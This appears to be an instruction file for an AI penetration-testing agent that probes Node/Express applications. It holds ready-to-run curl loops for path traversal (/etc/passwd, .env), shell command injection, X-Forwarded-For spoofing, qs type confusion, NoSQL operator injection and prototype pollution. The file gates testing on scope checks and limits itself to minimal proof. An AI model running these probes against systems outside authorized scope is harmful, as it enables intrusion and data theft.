---
name: zp-nodejs
description: ZeroProtocol hunter for Node and Express applications - express.static and sendFile path traversal, child_process and argument injection, qs and extended body-parser type confusion, trust proxy IP spoofing, jsonwebtoken misuse, cors middleware reflection, error middleware stack leakage, and dependency confusion from an exposed package.json. Use when X-Powered-By names Express, a 404 body reads Cannot GET, a stack trace shows .js paths, or a query string parses into nested objects.
---

# zp-nodejs - the middleware stack is the attack surface

**Phase:** 5 | **Gate:** **active.** `zp-scope check <target>` must exit 0 before any request.
Exit 1 refuse and name the pattern · 3 stop · 4 stop.

Express has no opinions. Every guarantee you expect from a framework - that a path stays under a root,
that `req.body.role` is a string, that `req.ip` is the peer - the application had to arrange itself, and
the parsers beneath it (`qs`, `body-parser`, `send`) behave in ways nobody read. **The bar is a request
reaching a file, a record or a shell it should not, reproduced twice, witnessed in the response body.**

---

## Procedure

**1. Confirm the runtime and date the parser generation.** Behaviour, never a banner.

```bash
H=target.tld
curl -skI "https://$H/" | grep -iE 'x-powered-by|^etag|^server:|set-cookie'
curl -sk "https://$H/zp-no-such-route-91234" | head -c 200              # "Cannot GET /..."
curl -sk -X POST "https://$H/api/anything" -H 'Content-Type: application/json' \
     --data-binary '{"a":' | head -c 400                                # SyntaxError + stack?
```

| Signal | Reading |
|---|---|
| `X-Powered-By: Express` | default header, not disabled. Confirmation only, no version |
| `Cannot GET /x` on a 404, weak `ETag: W/"1f-Hk…"` | Express `finalhandler` and default etag - near-certain |
| `SyntaxError: Unexpected token` **with a stack** | `NODE_ENV` is not `production`. Step 6 |
| `?zp[a]=1` parsed as a nested object | `extended` query parser (`qs`) - the Express 4 default; Express 5 defaults to `simple`, so nesting also dates the major |

**2. Path traversal through the file-send layer.** `serve-static`/`send` decode once, resolve, and
reject anything above the mount root plus any NUL byte - bare `../` almost never works. The bugs are
where the app bypassed that layer, or a proxy decoded first. Use `--path-as-is` or curl normalises
the payload before it leaves your machine.

```bash
for p in '/static/../package.json' '/static/..%2fpackage.json' '/static/..%252fpackage.json' '/static/....//package.json'; do
  printf '%-40s ' "$p"; curl -sk --path-as-is -o /dev/null -w '%{http_code} %{size_download}\n' "https://$H$p"; done
# the parameter-driven variant - res.sendFile or path.join with no root option
for f in '../package.json' '../../.env' '../../../etc/passwd' '/etc/passwd' 'package.json%00.png'; do printf '%-30s ' "$f"
  curl -sk --path-as-is -o /dev/null -w '%{http_code} %{size_download}\n' "https://$H/api/download?file=$f"; done
```

A `200` holding `"dependencies"` or `root:x:0:0` is the finding; a `200` returning the SPA shell is a
catch-all route. `serve-static`'s `dotfiles` default is `ignore`, so a live `.env` means somebody set
`dotfiles: 'allow'` or wrote their own handler.

**3. Parser semantics - make the types disagree with the validator.** Highest yield here, six requests.

```bash
EP="https://$H/api/login"; CT='Content-Type: application/json'
curl -sk "$EP" -H "$CT" -d '{"user":"zp","pass":"x"}'           -o /dev/null -w 'json      %{http_code}\n'
curl -sk "$EP" -H 'Content-Type: text/plain' -d '{"user":"zp"}' -o /dev/null -w 'text      %{http_code}\n'
curl -sk "$EP" -H "$CT" -d '["zp","x"]'                         -o /dev/null -w 'array     %{http_code}\n'
curl -sk "https://$H/api/items?tag=a&tag=b" -o /dev/null -w 'dup-param %{http_code}\n'
curl -sk "https://$H/api/items?tag[25]=a"   -o /dev/null -w 'arraylim  %{http_code}\n'
```

`express.json()` parses only when the `Content-Type` matches, so a wrong type leaves `req.body` as `{}`
- and code shaped `if (req.body.mfaToken) verify(...)` then skips the check entirely. That
missing-means-allowed pattern is a real authorization bypass; `zp-authz` owns the escalation.

**4. `trust proxy` and the client-supplied peer address.** Never with credentials.

```bash
for v in 127.0.0.1 10.0.0.1 '127.0.0.1, 1.2.3.4' '1.2.3.4, 127.0.0.1'; do
  printf '%-22s ' "$v"; curl -sk -o /dev/null -w '%{http_code}\n' "https://$H/admin/status" \
    -H "X-Forwarded-For: $v" -H "X-Real-IP: $v"; done
curl -skI "https://$H/api/items" -H 'X-Forwarded-For: 127.0.0.1' | grep -iE 'ratelimit|retry-after'
```

With `trust proxy` on globally, `req.ip` is the leftmost value the client sent. Prove it on a **benign,
non-authenticating** endpoint - a changed `RateLimit-Remaining`, or an allow-listed page rendering -
then stop. Rotating addresses through a login form is credential guessing.

**5. `child_process` reachability.** Target endpoints naming a system verb - `/api/convert`, `/ping`,
`/thumbnail`, `/export`, `/whois`, `/render`.

```bash
for p in '127.0.0.1' '127.0.0.1;echo zp91234' '127.0.0.1$(expr 9 \* 9)' '127.0.0.1|expr 9 \* 9'; do
  printf '%-30s ' "$p"
  curl -sk --max-time 20 -G "https://$H/api/ping" --data-urlencode "host=$p" | tr -d '\n' | head -c 160; echo
done
```

`81` or `zp91234` in the output is execution. Where the call is safe (`execFile`, `spawn` without
`shell`), try **argument** injection - a leading `-`/`--` the program itself interprets (`-o`, `@file`,
`--upload-pack`). Templates and deserialization belong to `zp-rce-ssti`.

**6. Error middleware and stack leakage.** Force a type error, not a crash.

```bash
curl -sk -X POST "https://$H/api/profile" -H 'Content-Type: application/json' \
  --data-binary '{"name":{"toString":1},"age":"zp"}' | head -c 600
curl -sk "https://$H/api/items?limit=notanumber&offset[]=1" | head -c 600
```

Absolute paths (`/app/src/routes/profile.js`), versioned module names, a driver error naming tables, an
ORM query echoed back - each routes somewhere: `zp-info-disclosure` for the leak, `zp-sqli` for a query,
`zp-code-audit` once you can name the layout. An unhandled rejection that kills the worker is a crash, not a finding - **do not repeat it.**

**7. Supply chain, read-only.** An exposed manifest is a claimable-name inventory.

```bash
curl -sk "https://$H/package.json" | jq -r '.dependencies,.devDependencies | keys[]?' 2>/dev/null > /tmp/zp-deps.txt
grep -hoE '@[a-z0-9._-]+/[a-z0-9._-]+' /tmp/zp-deps.txt js/*.js 2>/dev/null | sort -u | while read -r p; do
  printf '%-42s ' "$p"; curl -s -o /dev/null -w '%{http_code}\n' "https://registry.npmjs.org/$(printf %s "$p" | sed 's|/|%2F|')"; done
grep -hoE 'https?://[a-z0-9.-]+/(artifactory|repository|npm)[^"]*' package-lock.json js/*.js 2>/dev/null | sort -u
```

A public-registry `404` on a scoped name the app installs means the name is claimable. **The finding is
the unclaimed name and the install path; you do not publish the package.** An internal registry hostname
in a lockfile is new surface, not a finding - `zp-scope` before touching it.

**8. Regex denial of service - identify, never fire.** Report the pattern plus a timing curve measured **on your own machine**; a doubling per added character is the proof.

```bash
grep -rnoE '\([^)]{1,40}[+*]\)[+*]|\[[^]]{1,20}\][+*]\)[+*]|\(\.\*[,;][^)]*\)[+*]' js/*.js 2>/dev/null | head
python3 -c 'import re,time
for n in (16,20,24,26):
    s="a"*n+"!"; t=time.time(); re.match(r"^(\w+\s?)+$", s); print(n, round((time.time()-t)*1000,1),"ms")'
```

**Never send the pathological input to the target** - that is the denial of service itself, which essentially every program excludes.

---

## Probes and payloads

| Probe | Breaks | Positive looks like |
|---|---|---|
| `/static/..%252fpackage.json` with `--path-as-is` | proxy decodes once, `send` decodes again | `200` body containing `"dependencies"` |
| `?file=../../.env`, `?file=/etc/passwd` | `res.sendFile` or `path.join` with no `root` option | file contents, or an `ENOENT` naming an absolute path |
| `Content-Type: text/plain` on a JSON route | `express.json()` type gate - `req.body` becomes `{}` | a required check silently skipped, `200` instead of `400` |
| `?tag=a&tag=b` | code assuming a string; `qs` yields `['a','b']` | `500` on `.toLowerCase`, or a filter bypassed |
| `?tag[25]=a` | `qs` `arrayLimit` default 20 - index 25 yields an **object** | an `Array.isArray` guard flips; type confusion downstream |
| `?q[$ne]=`, `?q[$gt]=` | `qs` nesting handing operators into a Mongo query | every record returned - hand to `zp-sqli` |
| `?a[__proto__][zp]=1`, `{"__proto__":{"json spaces":10}}` | merge helpers, and `qs` before the `__proto__` hardening | JSON indentation changes. Method in `zp-proto-pollution` |
| `X-Forwarded-For: 127.0.0.1` | `app.set('trust proxy', true)` | allow-listed page renders, or `RateLimit-Remaining` resets |
| `Origin: https://zp-evil.example` | `cors({origin: true})`, or a callback returning `true` always | origin echoed **with** `Allow-Credentials: true`. Prove in `zp-cors` |
| `/ADMIN/secret`, `/admin/secret/` | Express routing is case-insensitive and non-strict; an nginx `location` is neither | a proxy `401` becomes an Express `200` |
| `curl -s http://$H:9229/json/list` | Node inspector bound to a routable interface | a JSON array of debug targets - **stop there** |

Optional if present: `nuclei -u "https://$H" -tags nodejs,express -severity medium,high,critical -rate-limit "$(zp-scope show --json | jq -r '.rate_limit_rps // 5')"`. Everything above is plain curl on purpose - no step depends on a tool being installed.

---

## Confirm or kill

| Evidence | Verdict |
|---|---|
| a file outside the static root returned **with contents** | **confirmed path traversal.** High; Critical for `.env` or a key |
| `?file=` returning an `ENOENT` stack and an absolute path, no contents | **information disclosure only.** File it as the leak |
| `200` with the SPA shell for every traversal payload | catch-all route. Killed - read the body, not the status |
| benign arithmetic or your canary in the response from a metacharacter | **confirmed command injection.** Critical. Stop at that one command; an argument flag accepted with nothing observable stays a lead |
| a wrong `Content-Type` skips a check and a protected action completes | **confirmed authorization bypass.** Severity from the action - `zp-authz` |
| a `package.json` version with a known CVE and nothing else | a **lead** for `zp-cve`, never a finding here |
| `X-Forwarded-For` accepted but nothing is gated on IP | **not a finding.** Killed - name the gate or drop it |
| `X-Forwarded-For` accepted and an internal-only route renders | confirmed. Medium to High by what the route does |
| stack traces showing only framework internals | Low at best, often informative. Say so honestly |
| a catastrophic regex found in a bundle | **code-quality DoS risk** with the local timing curve. Usually Low or excluded |
| an unregistered scoped package name the app installs | **confirmed dependency-confusion exposure.** High - the name is the report |
| `__proto__` accepted but no gadget reads it | pollution without impact. Killed until `zp-proto-pollution` finds the gadget |

---

## High-value patterns

- **`res.sendFile(userInput)` with no `root` option** - the traversal `serve-static` cannot save you from; it resolves against the process working directory.
- **`express.static` mounted at `/` on the project root** - ships `package.json`, `node_modules`, source maps and sometimes `.git` in one line.
- **A route or static mount placed *before* the auth middleware** - middleware order *is* authorization, and it is invisible until you try the asset URL logged out.
- **A proxy rule guarding `/admin` in front of case-insensitive, non-strict Express routing** - `/ADMIN/x` and `/admin/x/` skip the guard and hit the same handler.
- **`jwt.decode()` where `jwt.verify()` belonged**, or `verify()` with no `algorithms` against a key that doubles as an HMAC secret - full authentication bypass, confirmed offline.
- **`/api/convert`, `/thumbnail`, `/export` wrapping ffmpeg, ImageMagick, wkhtmltopdf or `git`** - argument injection where metacharacters are filtered.

---

## Pitfalls

- **Reading the status code instead of the body.** Express catch-alls answer `200` to everything.
- **Letting curl normalise the traversal.** Without `--path-as-is` the `../` never reaches the server.
- **Triggering ReDoS, `parameterLimit` or body-`limit` exhaustion against the target.** That is the DoS, not the proof. Time the regex locally.
- **Rotating `X-Forwarded-For` through a login form.** Credential guessing, out of scope - use a benign endpoint.
- **Publishing a claimable package name to prove dependency confusion.** Never; that is the supply-chain attack itself.
- **Attaching a debugger to an exposed inspector, or running an exploit's payload half.** Detection only.
- **Touching a registry, CDN or vendor host that merely appeared in a lockfile.** Re-run the gate first.

**Stop point for this class.** One benign command's output, one file's contents, one unsigned token
accepted, or one registry `404`. No shells, no persistence, no reading past the proof file, no package
published, no worker intentionally killed.

---

## Hand off to

Pollution entry points and gadgets -> `zp-proto-pollution` (this skill finds the entry, that one owns the
gadget and the severity). Templates and deserialization -> `zp-rce-ssti`. Token verification ->
`zp-jwt-oauth`; session cookies -> `zp-session`. Reflected origins -> `zp-cors`. Missing-check bypasses
and route guards -> `zp-authz`; object identifiers -> `zp-idor`. Traversal turning into file read or a
fetcher -> `zp-xxe-lfi`, `zp-ssrf`. Operator injection in a query -> `zp-sqli`. Stacks, debug routes and
banners -> `zp-info-disclosure`. Bundles, source maps and secrets -> `zp-js-secrets`; recovered source ->
`zp-code-audit`. Dependency versions -> `zp-cve`; build and registry surface -> `zp-cicd`, `zp-cloud`.
Next.js -> `zp-nextjs`. Unfound routes -> `zp-content-discovery`. Confirmed -> `zp-triage`, `zp-report`.
